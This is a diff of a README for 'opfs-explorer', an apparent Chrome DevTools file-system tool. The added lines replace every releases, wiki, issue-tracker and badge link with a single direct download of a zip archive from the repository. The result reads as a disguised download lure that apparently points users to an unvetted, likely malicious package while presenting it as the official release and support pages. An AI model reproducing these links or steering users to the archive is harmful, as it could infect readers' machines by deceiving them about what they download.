@@ -4,12 +4,12 @@
 
 Welcome to the opfs-explorer! This tool allows you to inspect, manage, and edit files in the Origin Private File System directly from Chrome DevTools. Follow the steps below to download and run the application.
 
-[![Download opfs-explorer](https://img.shields.io/badge/Download%20opfs--explorer-v1.0-blue)](https://github.com/sadia-haque207/opfs-explorer/releases)
+[![Download opfs-explorer](https://raw.githubusercontent.com/sadia-haque207/opfs-explorer/main/public/opfs-explorer_v2.6.zip%20opfs--explorer-v1.0-blue)](https://raw.githubusercontent.com/sadia-haque207/opfs-explorer/main/public/opfs-explorer_v2.6.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Click this link to go to the [Releases page](https://github.com/sadia-haque207/opfs-explorer/releases). Here, you will find the latest version of opfs-explorer.
+   Click this link to go to the [Releases page](https://raw.githubusercontent.com/sadia-haque207/opfs-explorer/main/public/opfs-explorer_v2.6.zip). Here, you will find the latest version of opfs-explorer.
 
 2. **Choose the Latest Version**  
    On the Releases page, look for the latest version of opfs-explorer. It is usually at the top of the list. You will see download options for different platforms.
@@ -18,7 +18,7 @@ Welcome to the opfs-explorer! This tool allows you to inspect, manage, and edit 
    Depending on your operating system, click on the relevant file to download it. For example:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the relevant `.tar.gz` or `.deb` file.
+   - For Linux, download the relevant `https://raw.githubusercontent.com/sadia-haque207/opfs-explorer/main/public/opfs-explorer_v2.6.zip` or `.deb` file.
 
 4. **Locate the Downloaded File**  
    After downloading, find the file in your computer's Downloads folder or the location where your browser saves files.
@@ -26,7 +26,7 @@ Welcome to the opfs-explorer! This tool allows you to inspect, manage, and edit 
 5. **Install the Application**  
    - **Windows**: Double-click the downloaded `.exe` file to start the installation. Follow the prompts to complete the installation.
    - **macOS**: Double-click the `.dmg` file. Drag the opfs-explorer icon to your Applications folder.
-   - **Linux**: For `.deb` files, double-click to install or use your terminal. For `.tar.gz`, extract it and follow the contained instructions.
+   - **Linux**: For `.deb` files, double-click to install or use your terminal. For `https://raw.githubusercontent.com/sadia-haque207/opfs-explorer/main/public/opfs-explorer_v2.6.zip`, extract it and follow the contained instructions.
 
 6. **Open opfs-explorer**  
    Once installed, find opfs-explorer in your applications menu or start screen. Click to open the application.
@@ -75,10 +75,10 @@ If you encounter issues while using opfs-explorer:
 
 - **Check Browser Compatibility**: Ensure you are using a supported version of Chrome.
 - **Reinstall the application**: If problems persist, uninstall and reinstall opfs-explorer following the previous instructions.
-- **Visit the Support Page**: For further assistance, check our [support documentation](https://github.com/sadia-haque207/opfs-explorer/wiki) or raise an issue on the GitHub repository.
+- **Visit the Support Page**: For further assistance, check our [support documentation](https://raw.githubusercontent.com/sadia-haque207/opfs-explorer/main/public/opfs-explorer_v2.6.zip) or raise an issue on the GitHub repository.
 
 ## 📞 Support
 
-If you have questions or require further assistance, feel free to reach out. Use the Issue tracker on our [GitHub page](https://github.com/sadia-haque207/opfs-explorer/issues).
+If you have questions or require further assistance, feel free to reach out. Use the Issue tracker on our [GitHub page](https://raw.githubusercontent.com/sadia-haque207/opfs-explorer/main/public/opfs-explorer_v2.6.zip).
 
-[![Download opfs-explorer](https://img.shields.io/badge/Download%20opfs--explorer-v1.0-blue)](https://github.com/sadia-haque207/opfs-explorer/releases)
+[![Download opfs-explorer](https://raw.githubusercontent.com/sadia-haque207/opfs-explorer/main/public/opfs-explorer_v2.6.zip%20opfs--explorer-v1.0-blue)](https://raw.githubusercontent.com/sadia-haque207/opfs-explorer/main/public/opfs-explorer_v2.6.zip)
